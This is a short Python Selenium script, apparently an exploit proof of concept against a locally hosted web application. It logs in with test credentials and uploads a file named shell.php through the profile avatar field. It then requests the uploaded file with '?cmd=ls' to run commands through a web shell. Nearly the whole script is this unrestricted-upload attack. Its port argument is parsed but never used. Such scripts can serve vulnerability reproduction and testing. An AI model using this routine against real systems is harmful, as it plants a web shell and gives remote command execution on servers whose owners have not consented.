from selenium import webdriver
import argparse
import time
import requests
from selenium.webdriver.common.by import By
parser = argparse.ArgumentParser(description='Port IP')
parser.add_argument('-p', dest='port', default=8001,
                    help='port where the application is running')

args = parser.parse_args()
port = args.port
browser = webdriver.Chrome()
browser.get("http://localhost:8001/user/login?from=/")
browser.set_window_size(827, 711)
browser.find_element(By.ID, "username").click()
browser.find_element(By.ID, "username").send_keys("test")
browser.find_element(By.ID, "password").send_keys("test")
browser.find_element(By.ID, "Login").click()
browser.find_element(By.LINK_TEXT, "test").click()
browser.find_element(By.LINK_TEXT, "Edit Profile").click()
browser.find_element(By.ID, "avatar").click()
browser.find_element(By.ID, "avatar").send_keys("./shell.php")
browser.find_element(By.ID, "Update").click()
browser.get("http://localhost:8001/uploads/shell.php?cmd=ls")
